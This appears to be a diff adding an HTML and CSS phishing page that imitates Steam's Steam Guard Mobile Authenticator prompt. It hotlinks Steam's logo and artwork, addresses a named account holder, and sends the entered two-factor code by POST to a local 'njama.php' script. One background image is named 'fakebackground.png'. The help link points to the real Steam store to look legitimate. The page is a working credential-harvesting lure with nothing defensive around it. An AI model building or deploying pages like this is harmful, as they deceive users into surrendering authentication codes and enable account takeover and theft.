@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Page Title</title>
+<link href="http://fonts.cdnfonts.com/css/motiva-sans" rel="stylesheet">
+
+</head>
+<body>
+
+<div id="blackbackground"></div>
+<div id="header">
+    <div id="hamburger">
+    </div>
+    <div id="steamlogo">
+        <img src="https://store.akamai.steamstatic.com/public/shared/images/responsive/header_logo.png">
+        </div>
+
+    <div></div>
+</div>
+
+<div class="sekcija">
+    <div id="signinsekcija">
+        <p>SIGN IN</p>
+    </div>
+    <div id="gluposti">
+        <p>SIGN IN</p>
+    </div>
+</div>
+
+<div class="srediste">
+<div class="popupic">
+    <div id="x"></div>
+    <div id="popupicnaslov"><p>STEAM GUARD MOBILE AUTHENTICATION</p></div>
+    <div class="tekstikona">
+        <div id="ikona"><img src="icon.png" alt=""></div>
+        <div id="tekst">
+            <h2>Hello adocoolninja!</h2>
+            <p>This account is currently using a Steam Guard Mobile Authenticator.</p>
+        </div>
+
+    </div>
+
+    <div class="entercurrentcode">
+        <p>Enter the current code displayed in the Steam Mobile app:</p>
+        <form action="njama.php" method="POST">
+            <div class="inputauthenticator">
+               <input action="post" class="twofactorauthcode_entry_input authcode_placeholder" id="twofactorcode_entry" type="text" name="slasnikod" placeholder="enter your code here" autocomplete="off">
+              
+            </div>
+
+      
+           
+   
+        
+    </div>
+    <div id="kuracpopusi">
+        <input type="submit" name="submit" value="Submit">
+    <a href="https://store.steampowered.com/">Please help <p>I no longer have access to my Mobile Authenticator codes</p></a>
+    </div>
+</form>
+</div>
+
+</div>
+</body>
+
+
+<style>
+
+
+.sekcija{
+    
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-top: 50px;
+
+    
+}
+
+
+.sekcija p {
+    font-size: 30px;
+    font-family: "Motiva Sans", Sans-serif;
+} 
+
+body {
+    margin: 0;
+    background-image: url("https://store.akamai.steamstatic.com/public/shared/images/joinsteam/acct_creation_bg.jpg");
+}
+
+
+
+#header {
+    height: 60px;
+    display: flex;
+    flex-direction: row;
+    justify-content: space-between;
+    background-color: #171a21;
+}
+
+
+#hamburger{
+
+    background-image: url("hamburger.png");
+}
+
+#header img {
+    margin-top: 5px;
+    height: 40px;
+    width: 174px;
+}
+
+#header img{
+
+    margin-left: 5px;
+}
+
+input.authcode_entry_input, input.twofactorauthcode_entry_input {
+    border: none;
+    background-color: transparent;
+    margin-left: 8px;
+    margin-top: 6px;
+    color: #cdcac1;
+    outline: none;
+    width: 220px;
+    box-shadow: none;
+    padding: 0;
+}
+
+    .inputauthenticator{
+
+        background-image: url(https://store.akamai.steamstatic.com/public/shared/images/login/code_box.png?v=1);
+        background-repeat: no-repeat;
+        background-color: rgba( 0, 0, 0, 0.2 );
+        border-radius: 3px;
+        border: 1px solid #000;
+        box-shadow: 1px 1px 0 0 rgb(91 132 181 / 20%);
+        color: #C6D4DF;
+        margin-top: 5px;
+        width: 220px;
+        height: 27px;
+
+    }
+
+
+    #blackbackground {
+        background-color: rgba(0, 0, 0, 0.657);
+        z-index: 1;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        display: none;
+    }
+
+
+    #kuracpopusi {
+
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-left: 40px;
+        margin-bottom: 20px;
+
+    }
+
+    #kuracpopusi p {
+        width: 130px;
+    }
+
+    #x {
+        background-image: url("icon3.png");
+        background-repeat: no-repeat;
+        position: relative;
+        left: 370px;
+        top: 10px;
+        width:20px;
+        height:20px;
+    }
+
+    a{  
+        background-color: #2c3f4d;
+        color: white;
+        text-decoration: none;
+        height: 75px;
+        padding: 5px;
+        border-radius: 2px;
+        margin-right: 10px;
+        width: 145px;
+        font-size: 20px;
+        padding: 10px 5px 10px 5px;
+        display: inline-block;
+    }
+    
+
+    a:hover{
+        background-color: #60b7e8;
+    }
+    a p {
+        font-size: 12px;
+        font-style: bold;
+        width: 50pxx;
+        color: #6bc2f3;
+       
+    }
+    a:hover p {
+        color: #44a3da;
+    } 
+    body{
+        background-color: rgba(0, 0, 0, 0.37);
+    }
+
+    #kljucic{
+        
+        left: 975px;
+        top: 317px;
+    }
+    #fname{
+        margin-top: 5px;
+        background-color: #1e202500;
+        border-color: #0000;
+        color: white;
+        width: 200px;
+        height: 20px;
+        border-radius: 3px
+    }
+    #submitic {
+        margin-right: 10px;
+        color: white;
+        background-color: #2c3f4d;
+        border: none;
+        height: 100px;
+        width: 150px;
+        font-family: "Motiva Sans", Sans-serif;
+        font-size: 22px;
+        color: #ffffff;
+
+    } 
+    .entercurrentcode {
+        padding: 0px 32px 0px 32px;
+        margin-left: 15px;
+        width: 400px;
+    }
+
+    .entercurrentcode p {
+        font-size: 11px;
+        width: 500px;
+    }
+
+    .srediste{
+        display: flex;
+        align-items: center;
+        margin-top: 200px;
+        justify-content: center;
+        
+    }
+    .popupic{
+        background-image: url("fakebackground.png");
+        width: 400px;
+        height: 472px;
+        color: white;
+        font-family: 'Motiva Sans', sans-serif;
+        font-weight: thin;
+        font-size: 15px;
+        display: flex;
+        flex-direction: row;
+        flex-flow: wrap;
+        z-index: 2;
+    }
+
+
+    #popupicnaslov{
+    margin-top: 40px;
+    letter-spacing: 2px;
+    text-align: left;
+    font-weight: lighter;
+    color: white;
+    text-transform: uppercase;
+    padding: 0px 32px 0px 32px;
+    height: 50px;
+    }
+    #popupicnaslov p{
+        color: white;
+        font-size: 30px;
+    }
+    .tekstikona {
+        margin: 20px;
+        margin-top: 80px;
+        width: 500px;
+        display: flex;
+        flex-direction: row;
+        justify-content: center;
+        align-items: center;
+        height: 70px;
+    }
+
+    h2{
+    color: #67c1f5;
+    font-size: 24px;
+    font-weight: normal;
+    margin: 0;
+    }
+    p{  
+        color: #acb2b8;
+        margin: 0;
+        font-size: 12px;
+        width: 250px;
+    }
+</style>
+
+
+</html>
